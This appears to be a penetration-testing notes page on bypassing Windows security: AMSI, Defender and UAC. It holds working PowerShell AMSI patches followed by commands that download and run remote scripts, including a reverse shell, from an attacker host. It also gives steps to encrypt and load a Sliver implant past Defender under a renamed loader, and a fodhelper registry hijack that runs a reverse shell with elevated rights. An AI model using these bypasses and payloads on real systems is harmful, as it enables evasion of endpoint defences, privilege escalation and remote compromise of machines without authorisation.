---
title: Bypassing Security
source_url: https://notes.incendium.rocks/pentesting-notes/windows-pentesting/bypassing-security
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: windows
---

## AMSI

### Powershell Only

```powershell
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
$me = $field.GetValue($field)
$me = $field.SetValue($null, [Boolean]"hhfff")

# Download and execute amsi.ps1 globally to globally bypass amsi
IEX((New-Object System.Net.WebClient).DownloadString('http://10.10.14.5/amsi.ps1'))
```

### Global&#x20;

```powershell
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)

# Download and execute reverse shell or any other script
IEX((New-Object System.Net.WebClient).DownloadString('http://10.10.14.5/x.ps1'))
```

## Windows Defender

For csharp, pe or raw executable's use Nimcrypt2:

```
nimcrypt -f INPUT.exe -t pe -s -e -o OUTPUT_enc.exe
```

* -t for filetype
* -e to use encryption

### PELoader + pe2shc

We first generate a Sliver implant and upload it to our Windows attacking host (not target). We will need <https://github.com/hasherezade/pe_to_shellcode> and <https://github.com/Hagrid29/PELoader>.

We first convert the PE to shellcode:

```sh
> .\pe2shc.exe sliver_PE.exe
```

Next, we use PE\_loader.exe to encrypt the shellcode:

```sh
> set hagrid=enc sliver_PE.shc.exe
> .\PELoader.exe
argument: enc sliver_PE.shc.exe
Encrypting File
```

This will output "sliver\_PE.shc.exe.enc". Upload this file to the target together with PELoader.exe. Of course rename PELoader.exe to incendiumrocks.exe. After that set the env and decrypt and execute the encrypted shellcode (our Sliver implant)

```bash
> set hagrid=mdll sliver_PE.shc.exe.enc
> .\incendiumrocks.exe
```

Done, check your listener in Sliver

## UAC

User Account Control (UAC) is a key part of Windows security. UAC reduces the risk of malware by limiting the ability of malicious code to execute with administrator privileges.

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2F1iDCTd9jCtCWg2UcaSqm%2Fimage.png?alt=media&amp;token=49ee3956-589c-486d-975f-ed5f5e80c73b" alt=""><figcaption></figcaption></figure>

### Check UAC settings

```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```

if **`5`**(**default**) it will ask the administrator to confirm to run non Windows binaries with high privileges:

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FVpj3aFOtLAG32mygs75b%2Fimage.png?alt=media&amp;token=85f64a06-b10a-4643-8535-97805e4a16d9" alt=""><figcaption></figcaption></figure>

### Common bypass with AutoElevate

Some executables can auto-elevate, achieving high IL without any user intervention. This applies to most of the Control Panel's functionality and some executables provided with Windows.

For an application, some requirements need to be met to auto-elevate:

* The executable must be signed by the Windows Publisher
* The executable must be contained in a trusted directory, like `%SystemRoot%/System32/` or `%ProgramFiles%/`

To check if a binary has autoElevate, we can use sigcheck:

```bash
C:\tools\> sigcheck64.exe -m c:/windows/system32/msconfig.exe
...
<asmv3:application>
	<asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">
		<dpiAware>true</dpiAware>
		<autoElevate>true</autoElevate>
	</asmv3:windowsSettings>
</asmv3:application>
```

**Fodhelper**

Fodhelper.exe is one of Windows default executables in charge of managing Windows optional features, including additional languages, applications not installed by default, or other operating system characteristics. Like most of the programs used for system configuration, fodhelper can auto elevate when using default UAC settings so that administrators won't be prompted for elevation when performing standard administrative tasks. Fodhelper can be abused without having access to a GUI.

When Windows opens a file, it checks the registry to know what application to use.

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2F9EBv3Kp2nexRINzxZSmg%2Fimage.png?alt=media&amp;token=f033ef69-b621-408f-8ab2-26113ee98a05" alt=""><figcaption></figcaption></figure>

We can set the following keys for the fodhelper binary:

```
C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
C:\> set CMD="cmd.exe /c /windows/tasks/shell.exe"

C:\> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
The operation completed successfully.

C:\> reg add %REG_KEY% /d %CMD% /f
The operation completed successfully.
```

And then proceed to execute **fodhelper.exe**, which in turn will trigger the execution of our reverse shell.

```
C:\> fodhelper.exe
```

### More bypasses with UACME

* Defeating Windows User Account Control by abusing built-in Windows AutoElevate backdoor.
